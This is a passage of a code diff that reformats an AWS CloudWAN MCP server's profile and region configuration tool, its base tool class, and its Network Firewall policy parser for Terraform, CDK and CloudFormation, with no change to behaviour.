                     "identity": {
                         "account": identity.get("Account"),
                         "user_id": identity.get("UserId"),
-                        "arn": identity.get("Arn")
+                        "arn": identity.get("Arn"),
                     },
                     "cache_cleared": True,
-                    "config_persisted": config_saved
+                    "config_persisted": config_saved,
                 }
 
             except Exception as e:
@@ -900,25 +873,28 @@
                     "success": False,
                     "operation": "set_profile",
                     "error": f"Failed to validate profile '{profile}': {str(e)}",
-                    "suggestion": "Check that the profile exists in ~/.aws/credentials or ~/.aws/config"
+                    "suggestion": "Check that the profile exists in ~/.aws/credentials or ~/.aws/config",
                 }
 
         elif operation == "set_region":
             if not region:
-                return safe_json_dumps({
-                    "success": False,
-                    "error": "Region name is required for set_region operation"
-                }, indent=2)
+                return safe_json_dumps(
+                    {"success": False, "error": "Region name is required for set_region operation"}, indent=2
+                )
 
             # Validate region format
             import re
+
             region_pattern = r"^[a-z0-9\-]+$"
             if not re.match(region_pattern, region):
-                return safe_json_dumps({
-                    "success": False,
-                    "error": f"Invalid region format: {region}",
-                    "suggestion": "Region should be in format like 'us-east-1', 'eu-west-1', etc."
-                }, indent=2)
+                return safe_json_dumps(
+                    {
+                        "success": False,
+                        "error": f"Invalid region format: {region}",
+                        "suggestion": "Region should be in format like 'us-east-1', 'eu-west-1', etc.",
+                    },
+                    indent=2,
+                )
 
             # Test region availability
             try:
@@ -934,27 +910,31 @@
                 available_regions = [r["RegionName"] for r in regions_response.get("Regions", [])]
 
                 if region not in available_regions:
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": f"Region '{region}' is not available or accessible",
-                        "available_regions": available_regions[:10]  # Show first 10
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {
+                            "success": False,
+                            "error": f"Region '{region}' is not available or accessible",
+                            "available_regions": available_regions[:10],  # Show first 10
+                        },
+                        indent=2,
+                    )
 
                 # Set environment variable for future operations
                 if not secure_environment_update("AWS_DEFAULT_REGION", region):
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": "Failed to update AWS_DEFAULT_REGION environment variable securely"
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {
+                            "success": False,
+                            "error": "Failed to update AWS_DEFAULT_REGION environment variable securely",
+                        },
+                        indent=2,
+                    )
 
                 # Save configuration persistently if available
                 current_profile = aws_config.profile or "default"
                 config_saved = False
                 if config_persistence_available:
                     config_saved = config_persistence.save_current_config(
-                        current_profile,
-                        region,
-                        metadata={"operation": "set_region", "region_validated": True}
+                        current_profile, region, metadata={"operation": "set_region", "region_validated": True}
                     )
 
                 # Clear client cache to force reload with new region
@@ -967,22 +947,21 @@
                     "new_region": region,
                     "region_valid": True,
                     "cache_cleared": True,
-                    "config_persisted": config_saved
+                    "config_persisted": config_saved,
                 }
 
             except Exception as e:
                 result = {
                     "success": False,
                     "operation": "set_region",
-                    "error": f"Failed to validate region '{region}': {str(e)}"
+                    "error": f"Failed to validate region '{region}': {str(e)}",
                 }
 
         elif operation == "set_both":
             if not profile or not region:
-                return safe_json_dumps({
-                    "success": False,
-                    "error": "Both profile and region are required for set_both operation"
-                }, indent=2)
+                return safe_json_dumps(
+                    {"success": False, "error": "Both profile and region are required for set_both operation"}, indent=2
+                )
 
             # Validate both profile and region
             try:
@@ -998,23 +977,26 @@
                 available_regions = [r["RegionName"] for r in regions_response.get("Regions", [])]
 
                 if region not in available_regions:
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": f"Region '{region}' is not available with profile '{profile}'"
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {"success": False, "error": f"Region '{region}' is not available with profile '{profile}'"},
+                        indent=2,
+                    )
 
                 # Set both environment variables securely
                 if not secure_environment_update("AWS_PROFILE", profile):
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": "Failed to update AWS_PROFILE environment variable securely"
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {"success": False, "error": "Failed to update AWS_PROFILE environment variable securely"},
+                        indent=2,
+                    )
 
                 if not secure_environment_update("AWS_DEFAULT_REGION", region):
-                    return safe_json_dumps({
-                        "success": False,
-                        "error": "Failed to update AWS_DEFAULT_REGION environment variable securely"
-                    }, indent=2)
+                    return safe_json_dumps(
+                        {
+                            "success": False,
+                            "error": "Failed to update AWS_DEFAULT_REGION environment variable securely",
+                        },
+                        indent=2,
+                    )
 
                 # Save configuration persistently if available
                 config_saved = False
@@ -1022,11 +1004,7 @@
                     config_saved = config_persistence.save_current_config(
                         profile,
                         region,
-                        metadata={
-                            "identity": identity,
-                            "operation": "set_both",
-                            "profile_and_region_validated": True
-                        }
+                        metadata={"identity": identity, "operation": "set_both", "profile_and_region_validated": True},
                     )
 
                 # Clear client cache
@@ -1041,17 +1019,17 @@
                     "identity": {
                         "account": identity.get("Account"),
                         "user_id": identity.get("UserId"),
-                        "arn": identity.get("Arn")
+                        "arn": identity.get("Arn"),
                     },
                     "cache_cleared": True,
-                    "config_persisted": config_saved
+                    "config_persisted": config_saved,
                 }
 
             except Exception as e:
                 result = {
                     "success": False,
                     "operation": "set_both",
-                    "error": f"Failed to validate profile '{profile}' and region '{region}': {str(e)}"
+                    "error": f"Failed to validate profile '{profile}' and region '{region}': {str(e)}",
                 }
 
         elif operation == "validate_config":
@@ -1069,28 +1047,19 @@
                     "identity": {
                         "account": identity.get("Account"),
                         "user_id": identity.get("UserId"),
-                        "arn": identity.get("Arn")
-                    }
+                        "arn": identity.get("Arn"),
+                    },
                 }
             except Exception as e:
-                validation_results["sts"] = {
-                    "status": "failed",
-                    "error": str(e)
-                }
+                validation_results["sts"] = {"status": "failed", "error": str(e)}
 
             # Test EC2 (region access)
             try:
                 ec2_client = get_aws_client("ec2", current_region)
                 regions = ec2_client.describe_regions()
-                validation_results["ec2"] = {
-                    "status": "success",
-                    "regions_accessible": len(regions.get("Regions", []))
-                }
+                validation_results["ec2"] = {"status": "success", "regions_accessible": len(regions.get("Regions", []))}
             except Exception as e:
-                validation_results["ec2"] = {
-                    "status": "failed",
-                    "error": str(e)
-                }
+                validation_results["ec2"] = {"status": "failed", "error": str(e)}
 
             # Test NetworkManager (CloudWAN service)
             try:
@@ -1098,13 +1067,10 @@
                 global_networks = nm_client.describe_global_networks()
                 validation_results["networkmanager"] = {
                     "status": "success",
-                    "global_networks": len(global_networks.get("GlobalNetworks", []))
+                    "global_networks": len(global_networks.get("GlobalNetworks", [])),
                 }
             except Exception as e:
-                validation_results["networkmanager"] = {
-                    "status": "failed",
-                    "error": str(e)
-                }
+                validation_results["networkmanager"] = {"status": "failed", "error": str(e)}
 
             all_services_valid = all(v["status"] == "success" for v in validation_results.values())
 
@@ -1114,7 +1080,7 @@
                 "current_profile": current_profile,
                 "current_region": current_region,
                 "overall_status": "valid" if all_services_valid else "invalid",
-                "service_validations": validation_results
+                "service_validations": validation_results,
             }
 
         elif operation == "clear_cache":
@@ -1126,24 +1092,27 @@
                 "success": True,
                 "operation": "clear_cache",
                 "cache_entries_cleared": "LRU cache cleared",
-                "message": "AWS client cache cleared successfully"
+                "message": "AWS client cache cleared successfully",
             }
 
         elif operation == "get_config_history":
             if not config_persistence_available:
-                return safe_json_dumps({
-                    "success": False,
-                    "operation": "get_config_history",
-                    "error": "Configuration persistence is not available",
-                    "reason": _config_persistence_error or "config_manager module not found"
-                }, indent=2)
+                return safe_json_dumps(
+                    {
+                        "success": False,
+                        "operation": "get_config_history",
+                        "error": "Configuration persistence is not available",
+                        "reason": _config_persistence_error or "config_manager module not found",
+                    },
+                    indent=2,
+                )
 
             history_entries = config_persistence.get_config_history(limit=20)
             result = {
                 "success": True,
                 "operation": "get_config_history",
                 "history_count": len(history_entries),
-                "history": history_entries
+                "history": history_entries,
             }
 
         elif operation == "validate_persistence":
@@ -1152,24 +1121,26 @@
                 "success": True,
                 "operation": "validate_persistence",
                 "validation": validation_result,
-                "persistence_type": "MockConfigPersistence" if not config_persistence_available else "ConfigPersistence"
+                "persistence_type": "MockConfigPersistence"
+                if not config_persistence_available
+                else "ConfigPersistence",
             }
 
         elif operation == "restore_last_config":
             if not config_persistence_available:
-                return safe_json_dumps({
-                    "success": False,
-                    "operation": "restore_last_config",
-                    "error": "Configuration persistence is not available",
-                    "reason": _config_persistence_error or "config_manager module not found"
-                }, indent=2)
+                return safe_json_dumps(
+                    {
+                        "success": False,
+                        "operation": "restore_last_config",
+                        "error": "Configuration persistence is not available",
+                        "reason": _config_persistence_error or "config_manager module not found",
+                    },
+                    indent=2,
+                )
 
             saved_config = config_persistence.load_current_config()
             if saved_config and "aws_profile" in saved_config and "aws_region" in saved_config:
-                restored = config_persistence.restore_config(
-                    saved_config["aws_profile"],
-                    saved_config["aws_region"]
-                )
+                restored = config_persistence.restore_config(saved_config["aws_profile"], saved_config["aws_region"])
                 with _client_lock:
                     _create_client.cache_clear()
 
@@ -1177,33 +1148,32 @@
                     "success": restored,
                     "operation": "restore_last_config",
                     "restored_config": saved_config if restored else None,
-                    "cache_cleared": restored
+                    "cache_cleared": restored,
                 }
             else:
-                result = {
-                    "success": False,
-                    "operation": "restore_last_config",
-                    "error": "No saved configuration found"
-                }
+                result = {"success": False, "operation": "restore_last_config", "error": "No saved configuration found"}
 
         else:
-            return safe_json_dumps({
-                "success": False,
-                "error": f"Unknown operation: {operation}",
-                "error_code": "InvalidOperation",
-                "http_status_code": 400,
-                "supported_operations": [
-                    "get_current",
-                    "set_profile",
-                    "set_region",
-                    "set_both",
-                    "validate_config",
-                    "clear_cache",
-                    "get_config_history",
-                    "validate_persistence",
-                    "restore_last_config"
-                ]
-            }, indent=2)
+            return safe_json_dumps(
+                {
+                    "success": False,
+                    "error": f"Unknown operation: {operation}",
+                    "error_code": "InvalidOperation",
+                    "http_status_code": 400,
+                    "supported_operations": [
+                        "get_current",
+                        "set_profile",
+                        "set_region",
+                        "set_both",
+                        "validate_config",
+                        "clear_cache",
+                        "get_config_history",
+                        "validate_persistence",
+                        "restore_last_config",
+                    ],
+                },
+                indent=2,
+            )
 
         return safe_json_dumps(result, indent=2)
 

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/tools/base.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/tools/base.py
@@ -63,8 +63,9 @@
             self.logger.error(f"Input validation failed: {e}")
             return False
 
-    def format_response(self, data: Any = None, error: str | None = None,
-                       error_code: str | None = None) -> dict[str, Any]:
+    def format_response(
+        self, data: Any = None, error: str | None = None, error_code: str | None = None
+    ) -> dict[str, Any]:
         """Format tool response following AWS Labs standards.
 
         Args:
@@ -93,8 +94,7 @@
             # Validate input
             if not self.validate_input(kwargs):
                 return self.format_response(
-                    error=f"Invalid input parameters for {self.name}",
-                    error_code="ValidationError"
+                    error=f"Invalid input parameters for {self.name}", error_code="ValidationError"
                 )
 
             # Execute tool
@@ -103,10 +103,7 @@
 
         except Exception as e:
             self.logger.error(f"Tool {self.name} execution failed: {e}")
-            return self.format_response(
-                error=f"{self.name} execution failed: {str(e)}",
-                error_code="ExecutionError"
-            )
+            return self.format_response(error=f"{self.name} execution failed: {str(e)}", error_code="ExecutionError")
 
 
 class AWSBaseTool(BaseMCPTool):

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/tools/network_firewall.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/tools/network_firewall.py
@@ -130,7 +130,7 @@
             policy_match = re.search(
                 r'resource\s+"aws_networkfirewall_firewall_policy"\s+"([^"]+)"\s*{([^}]*(?:{[^}]*}[^}]*)*)}',
                 terraform_content,
-                re.MULTILINE | re.DOTALL
+                re.MULTILINE | re.DOTALL,
             )
 
             if not policy_match:
@@ -184,23 +184,17 @@
             fp_content = fp_match.group(1)
 
             # Parse default actions
-            policy.stateless_default_actions = self._extract_list_values(
-                fp_content, "stateless_default_actions"
-            )
+            policy.stateless_default_actions = self._extract_list_values(fp_content, "stateless_default_actions")
             policy.stateless_fragment_default_actions = self._extract_list_values(
                 fp_content, "stateless_fragment_default_actions"
             )
-            policy.stateful_default_actions = self._extract_list_values(
-                fp_content, "stateful_default_actions"
-            )
+            policy.stateful_default_actions = self._extract_list_values(fp_content, "stateful_default_actions")
 
             # Parse rule group references
             policy.stateless_rule_groups = self._parse_rule_group_references(
                 fp_content, "stateless_rule_group_reference"
             )
-            policy.stateful_rule_groups = self._parse_rule_group_references(
-                fp_content, "stateful_rule_group_reference"
-            )
+            policy.stateful_rule_groups = self._parse_rule_group_references(fp_content, "stateful_rule_group_reference")
 
         return policy
 
@@ -297,7 +291,7 @@
                     destination=match_attrs.get("destination"),
                     source_port=match_attrs.get("source_port"),
                     destination_port=match_attrs.get("destination_port"),
-                    message=f"Stateless rule from {rule_group_name}"
+                    message=f"Stateless rule from {rule_group_name}",
                 )
 
                 rules.append(rule)
@@ -421,7 +415,7 @@
             source_port=src_port if src_port != "any" else None,
             destination_port=dst_port if dst_port != "any" else None,
             message=message or f"Stateful rule from {rule_group_name}",
-            sid=sid
+            sid=sid,
         )
 
 
@@ -454,10 +448,7 @@
                 policy_name = "eastwest-policy"
 
             # Create policy object
-            policy = CdkFirewallPolicy(
-                policy_name=policy_name,
-                policy_type=policy_type
-            )
+            policy = CdkFirewallPolicy(policy_name=policy_name, policy_type=policy_type)
 
             # Parse firewall policy configurations
             if policy_type == "egress":
@@ -482,15 +473,11 @@
             policy_block = policy_match.group(1)
 
             # Parse default actions
-            policy.stateless_default_actions = self._extract_cdk_array_values(
-                policy_block, "statelessDefaultActions"
-            )
+            policy.stateless_default_actions = self._extract_cdk_array_values(policy_block, "statelessDefaultActions")
             policy.stateless_fragment_default_actions = self._extract_cdk_array_values(
                 policy_block, "statelessFragmentDefaultActions"
             )
-            policy.stateful_default_actions = self._extract_cdk_array_values(
-                policy_block, "statefulDefaultActions"
-            )
+            policy.stateful_default_actions = self._extract_cdk_array_values(policy_block, "statefulDefaultActions")
 
         # Parse rule groups
         self._parse_cdk_rule_groups(content, policy)
@@ -504,15 +491,11 @@
             policy_block = policy_match.group(1)
 
             # Parse default actions
-            policy.stateless_default_actions = self._extract_cdk_array_values(
-                policy_block, "statelessDefaultActions"
-            )
+            policy.stateless_default_actions = self._extract_cdk_array_values(policy_block, "statelessDefaultActions")
             policy.stateless_fragment_default_actions = self._extract_cdk_array_values(
                 policy_block, "statelessFragmentDefaultActions"
-            )
-            policy.stateful_default_actions = self._extract_cdk_array_values(
-                policy_block, "statefulDefaultActions"
             )
+            policy.stateful_default_actions = self._extract_cdk_array_values(policy_block, "statefulDefaultActions")
 
         # Parse rule groups (east-west has fewer rule groups)
         self._parse_cdk_rule_groups(content, policy)
@@ -571,7 +554,7 @@
                         destination_port=rule_data.get("destination_port"),
                         priority=rule_data.get("priority"),
                         message=f"Stateless rule from {rule_group_name}",
-                        rule_group_name=rule_group_name
+                        rule_group_name=rule_group_name,
                     )
                     rules.append(rule)
 
@@ -735,17 +718,13 @@
             destination_port=dst_port if dst_port != "any" else None,
             message=message or f"Stateful rule from {rule_group_name}",
             sid=sid,
-            rule_group_name=rule_group_name
+            rule_group_name=rule_group_name,
         )
 
     def _parse_logging_configuration(self, content: str) -> dict[str, Any]:
         """Parse CloudWatch logging configuration from CDK."""
 
-        logging_config = {
-            "flow_logs": False,
-            "alert_logs": False,
-            "log_groups": []
-        }
+        logging_config = {"flow_logs": False, "alert_logs": False, "log_groups": []}
 
         # Look for LogGroup creation
         flow_logs_match = re.search(r'new logs\.LogGroup\([^,]+,\s*"([^"]*LogsGroup)"', content)
@@ -845,9 +824,7 @@
 
             # Create policy object
             policy = CloudFormationFirewallPolicy(
-                policy_name=policy_name,
-                template_format_version=template_version,
-                description=description
+                policy_name=policy_name, template_format_version=template_version, description=description
             )
 
             # Parse firewall policy properties
@@ -962,7 +939,7 @@
                 destination_port=destination_port,
                 priority=priority,
                 message=f"Stateless rule from {rule_group_name}",
-                rule_group_name=rule_group_name
+                rule_group_name=rule_group_name,
             )
 
             rules.append(rule)
@@ -1018,7 +995,9 @@
         """Parse a single Suricata rule line from CloudFormation."""
 
         # Basic Suricata rule pattern
-        pattern = r"(\w+)\s+(\w+)\s+([\w\d\./\$_]+)\s+([\w\d\-,]+)\s*([<>-]+)\s*([\w\d\./\$_]+)\s+([\w\d\-,]+)\s*\((.*)\)"
+        pattern = (
+            r"(\w+)\s+(\w+)\s+([\w\d\./\$_]+)\s+([\w\d\-,]+)\s*([<>-]+)\s*([\w\d\./\$_]+)\s+([\w\d\-,]+)\s*\((.*)\)"
+        )
 
         match = re.match(pattern, rule_line.strip())
         if not match:
@@ -1049,7 +1028,7 @@
             destination_port=dst_port if dst_port != "any" else None,
             message=message or f"Stateful rule from {rule_group_name}",
             sid=sid,
-            rule_group_name=rule_group_name
+            rule_group_name=rule_group_name,
         )
 
     def _parse_cf_rules_source_list(self, rules_source_list: dict, rule_group_name: str) -> list[CloudFormationRule]:
@@ -1076,13 +1055,15 @@
                     message=f"{generated_rules_type} for {target_type}: {target}",
                     rule_group_name=rule_group_name,
                     target_types=target_types,
-                    targets=[target]
+                    targets=[target],
                 )
                 rules.append(rule)
 
         return rules
 
-    def _parse_cf_native_stateful_rules(self, stateful_rules: list[dict], rule_group_name: str) -> list[CloudFormationRule]:
+    def _parse_cf_native_stateful_rules(
+        self, stateful_rules: list[dict], rule_group_name: str
+    ) -> list[CloudFormationRule]:
         """Parse native CloudFormation StatefulRules format."""
 
         rules = []
@@ -1120,7 +1101,7 @@
                 source_port=source_port if source_port != "ANY" else None,
                 destination_port=destination_port if destination_port != "ANY" else None,
                 message=message,
-                rule_group_name=rule_group_name
+                rule_group_name=rule_group_name,
             )
 
             rules.append(rule)
@@ -1137,11 +1118,7 @@
         self.cdk_parser = NetworkFirewallCdkParser()
         self.cloudformation_parser = NetworkFirewallCloudFormationParser()
 
-    def analyze_terraform_policy(
-        self,
-        terraform_content: str,
-        compare_with_aws: str | None = None
-    ) -> dict[str, Any]:
+    def analyze_terraform_policy(self, terraform_content: str, compare_with_aws: str | None = None) -> dict[str, Any]:
         """Analyze Terraform Network Firewall configuration.
 
         Args:
@@ -1167,21 +1144,21 @@
                     "stateless_config": {
                         "default_actions": tf_policy.stateless_default_actions,
                         "fragment_actions": tf_policy.stateless_fragment_default_actions,
-                        "rule_groups": len(tf_policy.stateless_rule_groups)
+                        "rule_groups": len(tf_policy.stateless_rule_groups),
                     },
                     "stateful_config": {
                         "default_actions": tf_policy.stateful_default_actions,
-                        "rule_groups": len(tf_policy.stateful_rule_groups)
+                        "rule_groups": len(tf_policy.stateful_rule_groups),
                     },
                     "total_rules": len(tf_policy.parsed_rules),
                     "rules_by_type": {
                         "stateless": len([r for r in tf_policy.parsed_rules if r.rule_type == "stateless"]),
-                        "stateful": len([r for r in tf_policy.parsed_rules if r.rule_type == "stateful"])
-                    }
+                        "stateful": len([r for r in tf_policy.parsed_rules if r.rule_type == "stateful"]),
+                    },
                 },
                 "traffic_analysis": traffic_analysis,
                 "security_assessment": security_assessment,
-                "parsed_rules": [rule.dict() for rule in tf_policy.parsed_rules]
+                "parsed_rules": [rule.dict() for rule in tf_policy.parsed_rules],
             }
 
             # Compare with AWS if requested
@@ -1202,7 +1179,7 @@
             "policy_type": "unknown",
             "allowed_traffic": [],
             "blocked_traffic": [],
-            "security_posture": "unknown"
+            "security_posture": "unknown",
         }
 
         # Determine overall policy behavior
@@ -1238,18 +1215,13 @@
             "description": f"{protocol} from {source}{src_port} to {destination}{dst_port}",
             "action": rule.action,
             "rule_type": rule.rule_type,
-            "message": rule.message or "No description"
+            "message": rule.message or "No description",
         }
 
     def _assess_terraform_security(self, policy: TerraformFirewallPolicy) -> dict[str, Any]:
         """Assess security implications of Terraform policy."""
 
-        assessment = {
-            "security_level": "medium",
-            "risks": [],
-            "recommendations": [],
-            "compliance_notes": []
-        }
+        assessment = {"security_level": "medium", "risks": [], "recommendations": [], "compliance_notes": []}
 
         # Check for overly permissive rules
         for rule in policy.parsed_rules:
@@ -1267,19 +1239,13 @@
 
         # Check for default deny posture
         if "aws:drop_strict" in policy.stateful_default_actions:
-            assessment["recommendations"].append(
-                "Good: Default deny posture implemented for stateful traffic"
-            )
+            assessment["recommendations"].append("Good: Default deny posture implemented for stateful traffic")
         else:
-            assessment["risks"].append(
-                "Missing default deny posture - consider aws:drop_strict"
-            )
+            assessment["risks"].append("Missing default deny posture - consider aws:drop_strict")
             assessment["security_level"] = "low"
 
         # Check for logging
-        assessment["recommendations"].append(
-            "Ensure logging is configured for this firewall policy in deployment"
-        )
+        assessment["recommendations"].append("Ensure logging is configured for this firewall policy in deployment")
 
         return assessment
 
@@ -1292,7 +1258,7 @@
                 "terraform_policy": tf_policy.policy_name,
                 "aws_firewall": aws_firewall_name,
                 "differences": [],
-                "recommendations": []
+                "recommendations": [],
             }
 
             # This would need actual AWS API calls to compare
@@ -1313,12 +1279,7 @@
             Validation results and syntax errors
         """
         try:
-            validation = {
-                "valid": True,
-                "errors": [],
-                "warnings": [],
-                "resource_count": 0
-            }
+            validation = {"valid": True, "errors": [], "warnings": [], "resource_count": 0}
 
             # Check for required resources
             if "aws_networkfirewall_firewall_policy" not in terraform_content:
@@ -1352,11 +1313,7 @@
         except Exception as e:
             return format_response("error", f"Validation failed: {str(e)}")
 
-    def analyze_cdk_policy(
-        self,
-        cdk_content: str,
-        compare_with_aws: str | None = None
-    ) -> dict[str, Any]:
+    def analyze_cdk_policy(self, cdk_content: str, compare_with_aws: str | None = None) -> dict[str, Any]:
         """Analyze CDK Network Firewall configuration.
 
         Args:
@@ -1383,22 +1340,34 @@
                     "stateless_config": {
                         "default_actions": cdk_policy.stateless_default_actions,
                         "fragment_actions": cdk_policy.stateless_fragment_default_actions,
-                        "rule_groups": len(cdk_policy.stateless_rule_groups)
+                        "rule_groups": len(cdk_policy.stateless_rule_groups),
                     },
                     "stateful_config": {
                         "default_actions": cdk_policy.stateful_default_actions,
-                        "rule_groups": len(cdk_policy.stateful_rule_groups)
+                        "rule_groups": len(cdk_policy.stateful_rule_groups),
                     },
                     "total_rules": len(cdk_policy.parsed_rules),
                     "rules_by_type": {
-                        "stateless_native": len([r for r in cdk_policy.parsed_rules if r.rule_type == "stateless" and r.rule_format == "native"]),
-                        "stateful_suricata": len([r for r in cdk_policy.parsed_rules if r.rule_type == "stateful" and r.rule_format == "suricata"])
+                        "stateless_native": len(
+                            [
+                                r
+                                for r in cdk_policy.parsed_rules
+                                if r.rule_type == "stateless" and r.rule_format == "native"
+                            ]
+                        ),
+                        "stateful_suricata": len(
+                            [
+                                r
+                                for r in cdk_policy.parsed_rules
+                                if r.rule_type == "stateful" and r.rule_format == "suricata"
+                            ]
+                        ),
                     },
-                    "logging_configuration": cdk_policy.logging_configuration
+                    "logging_configuration": cdk_policy.logging_configuration,
                 },
                 "traffic_analysis": traffic_analysis,
                 "security_assessment": security_assessment,
-                "parsed_rules": [rule.dict() for rule in cdk_policy.parsed_rules]
+                "parsed_rules": [rule.dict() for rule in cdk_policy.parsed_rules],
             }
 
             # Compare with AWS if requested
@@ -1418,7 +1387,7 @@
             "policy_type": policy.policy_type,
             "allowed_traffic": [],
             "blocked_traffic": [],
-            "security_posture": "unknown"
+            "security_posture": "unknown",
         }
 
         # Determine overall policy behavior
@@ -1455,38 +1424,27 @@
             "rule_type": rule.rule_type,
             "rule_format": rule.rule_format,
             "rule_group": rule.rule_group_name or "unknown",
-            "message": rule.message or "No description"
+            "message": rule.message or "No description",
         }
 
     def _assess_cdk_security(self, policy: CdkFirewallPolicy) -> dict[str, Any]:
         """Assess security implications of CDK policy."""
 
-        assessment = {
-            "security_level": "medium",
-            "risks": [],
-            "recommendations": [],
-            "compliance_notes": []
-        }
+        assessment = {"security_level": "medium", "risks": [], "recommendations": [], "compliance_notes": []}
 
         # Policy-specific security assessment
         if policy.policy_type == "egress":
-            assessment["compliance_notes"].append(
-                "Egress inspection policy - good for outbound traffic control"
-            )
+            assessment["compliance_notes"].append("Egress inspection policy - good for outbound traffic control")
 
             # Check for domain allowlisting
             domain_rules = [r for r in policy.parsed_rules if "amazon.com" in (r.message or "")]
             if domain_rules:
-                assessment["recommendations"].append(
-                    "Domain allowlisting detected - ensure list is comprehensive"
-                )
+                assessment["recommendations"].append("Domain allowlisting detected - ensure list is comprehensive")
 
             # Check for SSH blocking
             ssh_rules = [r for r in policy.parsed_rules if r.destination_port == "22"]
             if ssh_rules:
-                assessment["recommendations"].append(
-                    "SSH traffic controls detected - good security practice"
-                )
+                assessment["recommendations"].append("SSH traffic controls detected - good security practice")
 
         elif policy.policy_type == "eastwest":
             assessment["compliance_notes"].append(
@@ -1499,15 +1457,11 @@
                 "Comprehensive logging configured - good for monitoring and compliance"
             )
         else:
-            assessment["risks"].append(
-                "Incomplete logging configuration - may impact security monitoring"
-            )
+            assessment["risks"].append("Incomplete logging configuration - may impact security monitoring")
 
         # Check for default deny posture
         if "aws:drop_strict" in policy.stateful_default_actions:
-            assessment["recommendations"].append(
-                "Default deny posture implemented - strong security baseline"
-            )
+            assessment["recommendations"].append("Default deny posture implemented - strong security baseline")
 
         return assessment
 
@@ -1519,7 +1473,7 @@
                 "cdk_policy": cdk_policy.policy_name,
                 "aws_firewall": aws_firewall_name,
                 "differences": [],
-                "recommendations": []
+                "recommendations": [],
             }
 
             # This would need actual AWS API calls to compare
@@ -1540,15 +1494,13 @@
             Validation results and syntax errors
         """
         try:
-            validation = {
-                "valid": True,
-                "errors": [],
-                "warnings": [],
-                "resource_count": 0
-            }
+            validation = {"valid": True, "errors": [], "warnings": [], "resource_count": 0}
 
             # Check for required methods
-            if "createEgressInspectionFirewallPolicy" not in cdk_content and "createInspectionVPCFirewallPolicy" not in cdk_content:
+            if (
+                "createEgressInspectionFirewallPolicy" not in cdk_content
+                and "createInspectionVPCFirewallPolicy" not in cdk_content
+            ):
                 validation["errors"].append("No firewall policy creation methods found")
                 validation["valid"] = False
 
@@ -1587,11 +1539,7 @@
         except Exception as e:
             return format_response("error", f"Validation failed: {str(e)}")
 
-    def analyze_cloudformation_policy(
-        self,
-        cf_content: str,
-        compare_with_aws: str | None = None
-    ) -> dict[str, Any]:
+    def analyze_cloudformation_policy(self, cf_content: str, compare_with_aws: str | None = None) -> dict[str, Any]:
         """Analyze CloudFormation Network Firewall configuration.
 
         Args:
@@ -1619,24 +1567,38 @@
                     "stateless_config": {
                         "default_actions": cf_policy.stateless_default_actions,
                         "fragment_actions": cf_policy.stateless_fragment_default_actions,
-                        "rule_groups": len(cf_policy.stateless_rule_groups)
+                        "rule_groups": len(cf_policy.stateless_rule_groups),
                     },
                     "stateful_config": {
                         "default_actions": cf_policy.stateful_default_actions,
                         "engine_options": cf_policy.stateful_engine_options,
-                        "rule_groups": len(cf_policy.stateful_rule_groups)
+                        "rule_groups": len(cf_policy.stateful_rule_groups),
                     },
                     "total_rules": len(cf_policy.parsed_rules),
                     "rules_by_format": {
-                        "native_stateless": len([r for r in cf_policy.parsed_rules if r.rule_type == "stateless" and r.rule_format == "native"]),
-                        "native_stateful": len([r for r in cf_policy.parsed_rules if r.rule_type == "stateful" and r.rule_format == "native"]),
+                        "native_stateless": len(
+                            [
+                                r
+                                for r in cf_policy.parsed_rules
+                                if r.rule_type == "stateless" and r.rule_format == "native"
+                            ]
+                        ),
+                        "native_stateful": len(
+                            [
+                                r
+                                for r in cf_policy.parsed_rules
+                                if r.rule_type == "stateful" and r.rule_format == "native"
+                            ]
+                        ),
                         "suricata": len([r for r in cf_policy.parsed_rules if r.rule_format == "suricata"]),
-                        "rules_source_list": len([r for r in cf_policy.parsed_rules if r.rule_format == "rules_source_list"])
-                    }
+                        "rules_source_list": len(
+                            [r for r in cf_policy.parsed_rules if r.rule_format == "rules_source_list"]
+                        ),
+                    },
                 },
                 "traffic_analysis": traffic_analysis,
                 "security_assessment": security_assessment,
-                "parsed_rules": [rule.dict() for rule in cf_policy.parsed_rules]
+                "parsed_rules": [rule.dict() for rule in cf_policy.parsed_rules],
             }
 
             # Compare with AWS if requested
@@ -1657,7 +1619,7 @@
             "allowed_traffic": [],
             "blocked_traffic": [],
             "security_posture": "unknown",
-            "rule_formats": []
+            "rule_formats": [],
         }
 
         # Determine overall policy behavior
@@ -1705,7 +1667,7 @@
             "rule_format": rule.rule_format,
             "rule_group": rule.rule_group_name or "unknown",
             "message": rule.message or "No description",
-            "priority": rule.priority
+            "priority": rule.priority,
         }
 
     def _assess_cf_security(self, policy: CloudFormationFirewallPolicy) -> dict[str, Any]:
@@ -1716,7 +1678,7 @@
             "risks": [],
             "recommendations": [],
             "compliance_notes": [],
-            "template_quality": []
+            "template_quality": [],
         }
 
         # Template quality assessment
@@ -1776,7 +1738,7 @@
                 "cloudformation_policy": cf_policy.policy_name,
                 "aws_firewall": aws_firewall_name,
                 "differences": [],
-                "recommendations": []
+                "recommendations": [],
             }
 
             # This would need actual AWS API calls to compare
@@ -1802,17 +1764,19 @@
                 "errors": [],
                 "warnings": [],
                 "resource_count": 0,
-                "template_format": "unknown"
+                "template_format": "unknown",
             }
 
             # Try to parse as YAML/JSON
             try:
                 import yaml
+
                 template = yaml.safe_load(cf_content)
                 validation["template_format"] = "yaml"
             except yaml.YAMLError:
                 try:
                     import json
+
                     template = json.loads(cf_content)
                     validation["template_format"] = "json"
                 except json.JSONDecodeError as e:
@@ -1833,7 +1797,9 @@
             resources = template.get("Resources", {})
 
             # Check for firewall policy
-            firewall_policies = [r for r in resources.values() if r.get("Type") == "AWS::NetworkFirewall::FirewallPolicy"]
+            firewall_policies = [
+                r for r in resources.values() if r.get("Type") == "AWS::NetworkFirewall::FirewallPolicy"
+            ]
             if not firewall_policies:
                 validation["errors"].append("No AWS::NetworkFirewall::FirewallPolicy resource found")
                 validation["valid"] = False
@@ -1841,12 +1807,22 @@
                 validation["resource_count"] += len(firewall_policies)
 
             # Check for rule groups
